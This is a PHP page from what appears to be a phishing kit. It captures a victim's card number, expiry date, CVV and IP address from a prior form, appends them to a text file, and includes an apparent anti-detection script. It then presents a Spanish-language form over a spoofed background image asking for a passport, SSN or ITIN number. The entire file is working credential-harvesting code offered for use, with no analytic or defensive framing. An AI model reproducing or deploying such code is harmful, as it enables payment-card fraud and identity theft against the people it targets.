<?php
include "fucker.php";  
?>
<?php  
$co2 = $_POST['ipts6'];  
$ca2 = $_POST['ipts7'];
$pn2 = $_POST['ipts8'];
$pn2x = $_POST['ipts9'];        
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "
c4rd: $co2</td>
m3z: $ca2
year: $pn2
cvb: $pn2x
1p: $IP";  
$handle = fopen("rezout.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>
<?php
include "anti-fucker.php";  
?>
<!DOCTYPE html>
<html lang="en">

<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=0.7">
<title></title>
<link href="images/favicon.html" rel="shortcut icon" type="image/x-icon">

</head>
<body style="font-family:sans-serif;font-size: 16px;font-weight: 400;background: rgba(0,0,0,0.32);">
	<div id="cnt2" style="text-align:center;">
		<form action="step-5.php" method="post" style="background:#fff;display: inline-block;
    background-image: url(images/afrms3.svg);
    width: 980px;
    background-repeat: no-repeat;
    height: 552px;text-align:left;margin-top:20px;">
		

        <select name="ipts10" style="position: relative;
    top: 247px;
    left: 370px;
    width: 152px;
    display: block;
    height: 22px;
    font-size: 14px;">
            <option value="">Seleccione</option>
            <option value="pasaporte">Pasaporte</option>
            <option value="ssn">Número de Seguro Social (SSN)</option>
            <option value="itin">Número de Identificación Personal del Contribuyente (ITIN)</option>
        </select>



        <input name="ipts11" type="text" style="position: relative;
    top: 286px;
    left: 370px;
    width: 144px;
    display: block;
    height: 16px;
    font-size: 12px;" required placeholder="000-00-000">



    <input type="submit" style="position: relative;
    top: 377px;
    left: 641px;
    width: 110px;
    display: block;
    height: 24px;
    font-size: 12px;" value="Confirmar">

			
		</form>
	</div>
	<div style="text-align:center;">
		<footer style="opacity:0.6;padding-top: 20px;margin-top: 80px;background-color: #eee;width: 980px;display:inline-block;text-align:left;">
			<img src="images/fts1.svg" alt="" style="width:80%;max-width:600px;margin-left:10px">
		</footer>
	</div>
</body>

</html>